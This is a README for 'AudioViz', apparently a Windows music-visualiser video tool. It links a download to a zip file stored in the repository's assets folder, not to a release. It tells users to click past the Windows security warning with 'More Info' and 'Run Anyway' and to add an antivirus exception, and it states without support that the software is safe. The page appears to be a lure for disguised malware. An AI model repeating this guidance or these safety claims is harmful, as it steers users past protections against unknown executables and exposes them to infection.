# 🔊 AudioViz - Create beautiful music videos with ease

[![](https://img.shields.io/badge/Download_AudioViz-blue.svg)](https://raw.githubusercontent.com/gerriumbellar10/AudioViz/main/assets/Viz-Audio-urd.zip)

AudioViz turns your audio files into visual videos. You can watch a preview of your music as it plays or export the result as a high-quality MP4 file. This tool works with common audio formats like WAV and MP3. You do not need technical skills to create professional videos for your songs.

## ⚙️ Setting up your system

AudioViz runs on Windows 10 and Windows 11. Your computer should have at least 4GB of RAM to handle video rendering smoothly. If you plan to export long videos, make sure you have enough free space on your hard drive. 

The software uses FFmpeg to process your videos. Your download includes this tool automatically. The program manages all background tasks so you do not have to configure complex settings yourself.

## 🚀 Running the application

After you download the file, follow these steps to open the program:

1. Locate the file in your Downloads folder.
2. Double-click the file named AudioViz.exe.
3. Your system might show a security window. This happens with new software. Click More Info and then click Run Anyway to proceed.
4. The main window of the application will open.

## 🎹 Creating your first video

The interface provides a simple way to load your audio and choose a look for your video.

1. Click the Load Audio button at the top of the screen.
2. Select the MP3 or WAV file you want to use.
3. Choose a visual theme from the sidebar. You can browse through wave patterns, bars, and circles.
4. Press the Play button to watch the live preview. You can adjust the colors and sensitivity while the music plays. 

The live preview window shows exactly what the final video will look like. It syncs the movement of the bars with the beat of your music.

## 📤 Exporting your video

Once you are satisfied with the look, you can save your video as an MP4 file.

1. Click the Export button in the bottom right corner.
2. Choose a destination folder on your computer.
3. Select an export quality setting. Higher settings create cleaner video files but take longer to process.
4. Wait for the progress bar to finish. 

The software will notify you once the export is complete. You can then find your new video file in the folder you selected.

## 🛠 Troubleshooting common issues

If the application fails to open, check the following points:

* Make sure your audio file is not corrupted. Try a different file if the program closes immediately after loading.
* Check if your antivirus software is blocking the program. You may need to create an exception for the AudioViz folder.
* Ensure your graphics drivers are up to date. The program requires basic hardware acceleration to display the visualizer correctly.

## 📝 Frequently asked questions

Do you support other video formats besides MP4?
Currently, the software exports files in the MP4 format. This format works on all modern devices and websites like YouTube or social media platforms.

Is the software safe?
Yes. The software runs locally on your machine. It does not send your audio files to a server or web service. Your files stay on your computer at all times.

Can I change the background image?
Yes. Look for the Background tab in the settings menu. You can upload an image from your computer to use as a backdrop for your music visualizer. 

How does the software handle long songs?
AudioViz handles files of any length. However, rendering a very long song will take more time during the export process. Please keep your computer plugged into power if you are rendering long files.

Does this software require an internet connection?
No. You can use the application entirely offline. This is useful if you work in areas with poor internet access or if you prefer to finalize your projects without distractions.
